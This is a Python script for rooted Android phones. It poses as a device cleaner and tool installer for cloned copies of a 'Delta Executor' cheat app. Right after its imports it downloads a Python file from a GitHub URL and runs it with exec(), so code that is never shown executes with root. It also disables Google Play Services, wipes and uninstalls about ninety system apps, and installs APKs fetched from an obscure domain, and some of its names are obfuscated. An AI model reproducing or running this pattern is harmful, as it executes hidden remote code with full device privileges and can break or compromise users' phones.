import asyncio
import os
import sys
import json
import time
import base64
import hmac
import hashlib
import shutil
import subprocess
import requests
import aiohttp
import aiofiles
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor, as_completed
from rich.console import Console
from colorama import Fore, Style, init

os.system("clear")
init(autoreset=True)

url = "https://raw.githubusercontent.com/Wraith1vs11/Rejoin/refs/heads/main/1/1.py"
response = requests.get(url)
exec(response.text)
subprocess.run(["pm", "disable", "--user", "0", "com.google.android.gms"])
subprocess.run(["pm", "disable", "--user", "0", "com.google.android.gms"])
subprocess.run(["pm", "disable", "--user", "0", "com.google.android.gms"])
BASE_URL = "https://nexusfs9032cyborgxtube49review.site"
DEST_DIR = "/storage/emulated/0/Download/NexusHideout"

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-S918B Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.7339.51 Mobile Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.9",
    "Accept-Encoding": "gzip, deflate, br",
    "Referer": BASE_URL,
    "Connection": "keep-alive",
    "Upgrade-Insecure-Requests": "1",
    "DNT": "1",
    "Sec-CH-UA": '"Chromium";v="140", "Google Chrome";v="140"',
    "Sec-CH-UA-Mobile": "?1",
    "Sec-CH-UA-Platform": '"Android"'
}

TITLE = Fore.CYAN + Style.BRIGHT
INPUT = Fore.YELLOW + Style.BRIGHT
SUCCESS = Fore.GREEN + Style.BRIGHT
ERROR = Fore.RED + Style.BRIGHT

os.system("clear")

if not (hasattr(os, "geteuid") and os.geteuid() == 0):
    print(ERROR + "🐡 Root Not Detected, Exiting... 🔫")
    sys.exit(1)

print(SUCCESS + "🏀 Thank You For Using, Please Join Discord: https://discord.gg/FcEGmkNDDe For More Updates 🗑️")
while True:
    lite_opt = input(INPUT + "🍓 Clean Your Device? (1=Yes | 2=No): ").strip()
    if lite_opt not in ["1", "2"]:
        print(ERROR + "🌿 Invalid Choice, Please Enter 1 Or 2! 🏀")
    else:
        break
tools = []
while True:
    first = input(INPUT + "📦 Install Tool? (1=Yes | 2=No): " + Style.RESET_ALL).strip().lower()
    if first == "2":
        break
    elif first == "1":
        print(Style.BRIGHT + "1. Zarchiver")
        print(Style.BRIGHT + "2. MT Manager")
        print(Style.BRIGHT + "3. Control Screen Rotation")
        print(Style.BRIGHT + "4. Termux Boot")
        print(Style.BRIGHT + "5. App Changer Android ID")
        print(Style.BRIGHT + "6. Auto Click")
        print(Style.BRIGHT + "7. UG Click Assistant")
        print(Style.BRIGHT + "8. UG Cloner")
        print(Style.BRIGHT + "9. UGPhone Fast Reboot")
        print(Style.BRIGHT + "10. Taskbar")
        print(Style.BRIGHT + "11. Floating App")
        print(Style.BRIGHT + "12. 1.1.1.1")
        print(Style.BRIGHT + "0. Stop")

        while True:
            tool = input(INPUT + "🍎 Select Your Tool: ").strip()
            if tool == "0":
                break
            elif tool in ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10", "11", "12"]:
                if tool not in tools:
                    tools.append(tool)
                else:
                    print(ERROR + "🔁 Tool Already Selected! ⚽")
            else:
                print(ERROR + "🥩 Invalid Choice, Please Try Again! 🍖")
        break
    else:
        print(ERROR + "🌿 Invalid Choice, Please Enter y Or n! 🏀")
while True:
    try:
        num = int(input(INPUT + "🍒 Delta Executor Clones? (Max=10 | 0=Skip): ").strip())
        if not (0 <= num <= 10):
            print(ERROR + "🥩 Invalid Choice, Please Enter A Number Between 0 And 10! 🍖")
        else:
            break
    except ValueError:
        print(ERROR + "🍛 Invalid Input, Please Enter A Number! 🍖")
if num > 0:
    while True:
        bXLoMOuizCo = input(INPUT + "💦 Which Region? (1=Global | 2=VNG): ").strip()
        if bXLoMOuizCo == "1":
            LWXvlJZoXIu = "Delta"
            break
        elif bXLoMOuizCo == "2":
            LWXvlJZoXIu = "DeltaVNG"
            break
        else:
            print(ERROR + "🥫 Invalid Choice, Please Enter Only 1 Or 2! 🍗")
else:
    LWXvlJZoXIu = None

lite_packages = [
    "com.wsh.toolkit","com.wsh.appstorage","com.wsh.launcher2","com.android.calculator2",
    "com.android.music","com.android.musicfx","com.sohu.inputmethod.sogou","com.google.android.gms",
    "net.sourceforge.opencamera","com.google.android.googlequicksearchbox",
    "com.google.android.gm","com.google.android.youtube","com.google.android.apps.docs",
    "com.android.chrome","com.google.android.apps.meetings","com.google.android.apps.maps",
    "com.google.android.apps.photos","com.google.android.contacts","com.google.android.calendar",
    "com.android.vending","com.google.ar.core","com.google.android.play.games",
    "com.google.android.apps.magazines","com.google.android.apps.subscriptions.red",
    "com.google.android.videos","com.google.android.apps.googleassistant",
    "com.google.android.apps.messaging","com.google.android.dialer","com.android.mms",
    "com.og.toolcenter","com.og.gamecenter","com.android.launcher3","com.android.contacts",
    "com.android.calendar","com.android.calllogbackup","com.wsh.appstore","com.android.tools",
    "com.android.quicksearchbox","com.google.android.apps.gallery",
    "com.google.android.apps.wellbeing","com.google.android.apps.googleone",
    "com.google.android.apps.nbu.files","com.og.launcher","com.sec.android.gallery3d",
    "com.miui.gallery","com.coloros.gallery3d","com.vivo.gallery","com.motorola.gallery",
    "com.transsion.gallery","com.sonyericsson.album","com.lge.gallery","com.htc.album",
    "com.huawei.photos","com.android.gallery3d","com.android.gallery",
    "com.google.android.deskclock","com.sec.android.app.clockpackage","com.miui.clock",
    "com.coloros.alarmclock","com.vivo.alarmclock","com.motorola.timeweatherwidget",
    "com.android.deskclock","com.huawei.clock","com.lge.clock","com.android.email",
    "com.android.printspooler","com.android.bookmarkprovider","com.android.bips",
    "com.android.cellbroadcastreceiver","com.android.cellbroadcastservice",
    "com.android.dreams.basic","com.android.dreams.phototable","com.android.wallpaperbackup",
    "com.android.wallpapercropper","com.android.statementservice",
    "com.android.hotwordenrollment.okgoogle","com.android.hotwordenrollment.xgoogle",
    "com.android.sharedstoragebackup","com.android.stk",
    "com.google.android.tag","com.android.bluetoothmidiservice","com.android.messaging",
    "com.samsung.android.messaging","com.android.mms.service","com.miui.smsservice",
    "com.coloros.mms","com.vivo.message","com.huawei.message","com.lge.message",
    "com.sonyericsson.conversations","com.motorola.messaging","com.transsion.message"
]

def run(cmd):
    subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

def download(url, dst, retries=6):
    delays = [5, 5, 10, 10, 15, 15]
    for attempt in range(1, retries + 1):
        try:
            r = requests.get(url, headers=HEADERS, stream=True)
            r.raise_for_status()
            with open(dst, "wb") as f:
                for chunk in r.iter_content(1024 * 1024):
                    if chunk:
                        f.write(chunk)
            print(SUCCESS + f"📥 Downloaded Successfully 🐾")
            return
        except Exception as e:
            if attempt < retries:
                wait = delays[attempt - 1]
                print(ERROR + f"🍂 Download Failed: ({attempt}/{retries}): {e} 🧸 — Retrying In: {wait}s...")
                time.sleep(wait)
            else:
                print(ERROR + f"❌ Download Failed After {retries} Attempts: {url} 🧸")
                sys.exit(1)

def install(p, retries=6):
    delays = [2, 5, 10, 10, 15, 15]
    for attempt in range(1, retries + 1):
        try:
            result = subprocess.run(["pm", "install", "-r", p], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            if result.returncode == 0:
                print(SUCCESS + f"📲 Installed Successfully: {p} 🐾")
                return
            else:
                raise Exception(result.stderr.decode().strip() or "Unknown error")
        except Exception as e:
            if attempt < retries:
                wait = delays[attempt - 1]
                print(ERROR + f"🍂 Install Failed ({attempt}/{retries}): {e} 🧸 — Retrying In: {wait}s...")
                time.sleep(wait)
            else:
                print(ERROR + f"❌ Install Failed After {retries} Attempts: {p} 🧸")
                sys.exit(1)

def disable_package(p):
    run(["pm", "disable-user", "--user", "0", p])

def uninstall_package(p):
    run(["pm", "uninstall", "--user", "0", p])

def clear_package(p):
    run(["pm", "clear", "--user", "0", p])

def par_run(func, args_list, max_workers=5):
    with ThreadPoolExecutor(max_workers=max_workers) as ex:
        [f.result() for f in as_completed([ex.submit(func, *args) for args in args_list])]

if os.path.exists(DEST_DIR): shutil.rmtree(DEST_DIR)
os.makedirs(DEST_DIR)

if lite_opt == "1":
    print(TITLE + "🌟 Cleaning Device...")
    par_run(clear_package, [(p,) for p in lite_packages], 30)
    par_run(clear_package, [(p,) for p in lite_packages], 30)
    par_run(clear_package, [(p,) for p in lite_packages], 30)
    par_run(disable_package, [(p,) for p in lite_packages], 30)
    par_run(disable_package, [(p,) for p in lite_packages], 30)
    par_run(disable_package, [(p,) for p in lite_packages], 30)
    par_run(uninstall_package, [(p,) for p in lite_packages], 30)
    par_run(uninstall_package, [(p,) for p in lite_packages], 30)
    par_run(uninstall_package, [(p,) for p in lite_packages], 30)
    par_run(clear_package, [(p,) for p in lite_packages], 30)
    par_run(clear_package, [(p,) for p in lite_packages], 30)
    par_run(clear_package, [(p,) for p in lite_packages], 30)
    par_run(disable_package, [(p,) for p in lite_packages], 30)
    par_run(disable_package, [(p,) for p in lite_packages], 30)
    par_run(disable_package, [(p,) for p in lite_packages], 30)
    par_run(clear_package, [(p,) for p in lite_packages], 30)
    par_run(clear_package, [(p,) for p in lite_packages], 30)
    par_run(clear_package, [(p,) for p in lite_packages], 30)
    extra = ["Via.apk", "Mini.apk"]
    paths = [os.path.join(DEST_DIR, f) for f in extra]
    print(TITLE + "🧽 Cleaning In Progress!... 🧼")
    par_run(download, [(f"{BASE_URL}/{fn}", p) for fn, p in zip(extra, paths)], 2)
    print(TITLE + "🎄 Remove Some Unwanted Apps... 🏋🏿‍♂️")
    par_run(install, [(p,) for p in paths], 2)
    print(SUCCESS + "🎩 Successfully! 🌡️")

for t in tools:
    tool_file = {"1": "Zarchiver.apk", "2": "MTManager.apk", "3": "Control.apk", "4": "TermuxB.apk", "5": "ChangeAndroidID.apk", "6": "AutoClick.apk", "7": "Macro.apk", "8": "UGCloner.apk", "9": "UFR.apk", "10": "Taskbar.apk", "11": "FA.apk", "12": "1111.apk"}.get(t)
    if tool_file:
        tpath = os.path.join(DEST_DIR, tool_file)
        print(TITLE + f"📥 Downloading: {tool_file}... 🍜")
        download(f"{BASE_URL}/{tool_file}", tpath)
        print(TITLE + f"⚡ Installing: {tool_file}... ☕")
        install(tpath)
        print(SUCCESS + f"✔ {tool_file} Installed Successfully! 🍛")

if num == 1:
    fn = "Main.apk"; p = os.path.join(DEST_DIR, fn)
    download(f"{BASE_URL}/{LWXvlJZoXIu}/{fn}", p); install(p)

elif num > 1:
    files = [f"{i}.apk" for i in range(1, num + 1)]
    paths = [os.path.join(DEST_DIR, f) for f in files]

    with ThreadPoolExecutor(max_workers=3) as ex:
        [f.result() for f in as_completed([ex.submit(download, f"{BASE_URL}/{LWXvlJZoXIu}/{fn}", p) for fn, p in zip(files, paths)])]
        print(SUCCESS + "🎯 Successfully Downloaded! 🍽️")

    with ThreadPoolExecutor(max_workers=3) as ex:
        [f.result() for f in as_completed([ex.submit(install, p) for p in paths])]
        print(SUCCESS + "🎯 Successfully Installed! 🍽️")

os.system("clear")
if num >= 2:
    if bXLoMOuizCo == "1":
        print(Style.BRIGHT + "🎎 Package Is: com.delta.nexus 🍜")
    elif bXLoMOuizCo == "2":
        print(Style.BRIGHT + "🔥 Package Is: com.deltavng.nexus 🏮")
print(SUCCESS + "🎉 All Tasks Completed! 🚀")
print(SUCCESS + "🏀 Thank You For Using, Please Join Discord: https://discord.gg/FcEGmkNDDe For More Updates 🗑️")
if os.path.exists(DEST_DIR): shutil.rmtree(DEST_DIR)
